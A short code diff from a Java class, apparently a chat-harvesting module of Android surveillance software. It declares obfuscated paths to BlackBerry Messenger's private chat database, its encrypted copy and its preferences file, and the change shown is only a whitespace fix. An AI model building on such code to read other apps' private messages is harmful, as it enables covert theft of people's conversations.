@@ -65,7 +65,7 @@ public class ChatBBM extends SubModuleChat {
 	String pObserving = M.e("com.bbm");
 	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
 	String dbFileMasterEnc = M.e("/data/data/com.bbm/files/bbmcore/master.enc");
-	String bbmPref = M.e ("/data/data/com.bbm/shared_prefs/com.blackberry.bbm.PREFERENCES.xml");
+	String bbmPref = M.e("/data/data/com.bbm/shared_prefs/com.blackberry.bbm.PREFERENCES.xml");
 
 	private long lastBBM;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
